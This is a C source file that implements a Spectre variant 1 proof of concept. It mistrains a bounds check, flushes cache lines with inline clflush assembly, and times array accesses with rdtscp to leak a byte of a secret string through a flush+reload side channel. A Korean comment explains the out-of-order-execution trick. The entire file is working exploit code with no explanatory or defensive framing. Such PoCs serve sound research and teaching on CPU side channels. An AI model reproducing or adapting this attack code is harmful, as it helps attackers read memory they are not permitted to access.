#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

unsigned int array1_size = 16;
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t array2[256 * 512];

char * secret = "My secret";

uint8_t temp = 0;

void specu(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

extern void clflush(void *);
asm(
".section .text\n"
".global clflush\n"
"clflush:\n"
" mfence\n"
" clflush (%rdi)\n"
" retq\n"
);

int main(int argc, char ** argv) {
  static int results[256] = {0,};
  int tries, i, j, mix_i, junk = 0;
  volatile uint8_t * addr;
  size_t training_x, x;
  size_t malicious_x = (size_t)(secret - (char * ) array1);

  for (i = 0; i < sizeof(array2); i++) {
    array2[i] = 1;
  }

  for (tries = 999; tries>0; tries--){
    for (i = 0; i < 256; i++)
      clflush(&array2[i * 512]);

    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      clflush(&array1_size);

      for (volatile int z = 0; z < 100; z++) {}

      x = ((j % 6) - 1) & ~0xFFFF;
      x = (x | (x >> 16));
      x = training_x ^ (x & (malicious_x ^ training_x));
      // OoE를 트리거 하기 위한 쓸데 없는 연산임. 결국 x = malicious_x

      specu(x);
    }

    unsigned long long t, t1, t2;
    int min = 99999, min_val;

    for (i = 0; i < 256; i++) {
      addr = & array2[i * 512];
      t1 = __rdtscp(&junk);
      junk = *addr;
      t2 = __rdtscp(&junk);
      t = t2-t1;
      if (t < min) {
        min = t;
        min_val = i;
      }
    }
    junk ^= results[0];
    results[min_val]++;
  }

  int max_hit = 0, max_hit_val;
  for (i = 0x30; i<256; i++) {
    if (max_hit < results[i]){
      max_hit = results[i];
      max_hit_val = i;
    }
  }
  printf("%x[%c]\n", max_hit_val, max_hit_val);
  return 0;
}